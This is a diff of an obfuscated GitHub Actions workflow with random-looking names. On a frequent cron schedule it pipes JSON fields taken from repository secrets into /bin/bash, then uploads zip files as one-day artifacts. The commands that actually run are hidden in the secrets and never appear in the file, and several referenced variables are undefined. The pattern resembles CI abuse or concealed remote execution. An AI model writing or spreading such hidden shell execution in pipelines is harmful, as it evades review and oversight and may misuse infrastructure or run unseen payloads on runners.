@@ -1,9 +1,9 @@
 name: iancreate789
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '26 0/6 * * *'
 
+  schedule:
+    - cron: '27 1,7,13,19 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,22 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: iancreate789
         env:
-          rxa4: ${{ secrets.rxa4 }}
+          ptzt88: ${{ secrets.ptzt88 }}
         run: |
-          echo $rxa4 | jq -r .gwa994 | /bin/bash
-          echo $qvhf4127 | jq -r .wbvwu91533 | /bin/bash
-          echo $na6331 | jq -r .i4 | /bin/bash
-          echo $szuw23 | jq -r .tm32635 | /bin/bash
-          echo $x820 | jq -r .syj0 | /bin/bash
-          echo $x46166 | jq -r .gez7 | /bin/bash
-          echo $ajfiq24618 | jq -r .udt9 | /bin/bash
-          echo $qizfs6 | jq -r .qpu6307 | /bin/bash
-          echo $zdd928 | jq -r .hno083 | /bin/bash
-          echo $ur73 | jq -r .p433 | /bin/bash
-          echo $gmmc367 | jq -r .ei5827 | /bin/bash
-          echo $dkwqt252 | jq -r .zdaq176 | /bin/bash
-          echo $lhedp64 | jq -r .bzoav854 | /bin/bash
-          echo $gjma41228 | jq -r .ucdsh86942 | /bin/bash
-          echo $pawc43 | jq -r .eaq5163 | /bin/bash
-          echo $jqov4426 | jq -r .nkm4 | /bin/bash
+          printf '%s' "$ptzt88" | jq -r .g78617 | /bin/bash
+          printf '%s' "$obtiy26917" | jq -r .nyklc92560 | /bin/bash
+          printf '%s' "$ubvl49217" | jq -r .ifxd1 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: VEOpSRNu
+          path: "*.zip"
+          retention-days: 1
